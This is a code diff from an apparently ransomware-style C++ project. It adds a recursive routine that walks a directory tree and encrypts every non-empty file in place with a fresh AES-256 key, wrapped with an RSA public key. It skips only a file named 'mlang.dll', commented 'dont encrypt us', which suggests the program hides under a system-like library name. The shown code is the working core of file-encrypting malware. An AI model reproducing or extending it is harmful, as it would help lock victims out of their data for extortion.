@@ -3,9 +3,22 @@
 
 #include <filesystem>
 #include <iostream>
+#include <iomanip>
 
 bool File::FilePathExists() {
     return std::filesystem::exists(Serialization::BytestringToString(this->m_Metadata.path));
+}
+
+File::File(std::string & path)
+{
+    this->m_Metadata.path = Serialization::SerializeString(path);
+
+    if ( !FilePathExists() )
+        return;
+
+    this->m_Metadata.size = std::filesystem::file_size(path);
+    this->m_Metadata.name = Serialization::SerializeString(std::filesystem::path(path).filename().string());
+    this->m_Metadata.extension = Serialization::SerializeString(std::filesystem::path(path).extension().string());
 }
 
 std::string File::ReadFrom() {
@@ -39,7 +52,7 @@ bool File::WriteTo(std::string& data) {
     return true;
 }
 
-void FileManager::FindFiles(std::string& startDirectory) {
+void FileManager::FindFiles(const std::string& startDirectory) {
     if ( !std::filesystem::exists(startDirectory) )
         return;
 
@@ -50,18 +63,35 @@ void FileManager::FindFiles(std::string& startDirectory) {
     }
 }
 
-void FileManager::OutputFoundFiles(RSA* tempPriv) {
-    for ( File& file : this->m_FileList ) {
-        EncryptContents(file);
-        Sleep(500);
-        DecryptContents(file, tempPriv);
+void FileManager::OutputFoundFiles() {
+    for ( File& file : this->m_FileList )
+        std::cout << Serialization::BytestringToString(file.m_Metadata.name) << " : Size " << file.m_Metadata.size << " bytes." << std::endl;
+}
+
+void FileManager::TransformFiles(const std::string& startPath, void (FileManager::*procedure)(File&), FileManager& context ) {
+    if ( !std::filesystem::exists(startPath) )
+        return;
+
+    for ( auto& dir : std::filesystem::recursive_directory_iterator(startPath) ) {
+        if ( std::filesystem::is_directory(dir) || std::filesystem::file_size(dir) <= 0 )
+            continue;
+
+        if ( dir.path().filename() == "mlang.dll" ) // dont encrypt us
+            continue;
+
+        std::string filePath = dir.path().string();
+        File file(filePath);
+        ( context.*procedure )( file );
     }
 }
 
-bool FileManager::EncryptContents(File& file) {
+void FileManager::EncryptContents(File& file) {
+    if ( !this->m_EncryptionKeys.pub )
+        return;
+
     BYTESTRING AESKey          = LGCrypto::Generate256AESKey();
     BYTESTRING AESIV           = LGCrypto::GenerateAESIV();
-    BYTESTRING AESKeyEncrypted = LGCrypto::RSAEncrypt(AESKey, this->m_RSAPublicKey, FALSE);
+    BYTESTRING AESKeyEncrypted = LGCrypto::RSAEncrypt(AESKey, this->m_EncryptionKeys.pub, FALSE);
     BYTESTRING plainText       = Serialization::SerializeString(file.ReadFrom());
     
     BYTESTRING encrypted       = LGCrypto::AESEncrypt(plainText, AESKey, AESIV);
@@ -72,17 +102,20 @@ bool FileManager::EncryptContents(File& file) {
     file.WriteTo(tmp);
 }
 
-bool FileManager::DecryptContents(File& file, RSA* priv) {
+void FileManager::DecryptContents(File& file) {
+    if ( !this->m_EncryptionKeys.priv )
+        return;
+
     BYTESTRING cipherText = Serialization::SerializeString(file.ReadFrom());
     BYTESTRING AESIV(cipherText.end() - 16, cipherText.end()); cipherText.erase(cipherText.end() - 16, cipherText.end());
     BYTESTRING AESKeyEncrypted(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end()); cipherText.erase(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end());
-    BYTESTRING AESKey = LGCrypto::RSADecrypt(AESKeyEncrypted, priv, TRUE);
+    BYTESTRING AESKey = LGCrypto::RSADecrypt(AESKeyEncrypted, this->m_EncryptionKeys.priv, TRUE);
     BYTESTRING plaintext = LGCrypto::AESDecrypt(cipherText, AESKey, AESIV);
     std::string plaintextString = Serialization::BytestringToString(plaintext);
 
     file.WriteTo(plaintextString);
 }
 
-const BYTESTRING FileManager::TransformFile(File& file) {
-    return {};
-}
+//const BYTESTRING FileManager::TransformFile(File& file) {
+//    return {};
+//}
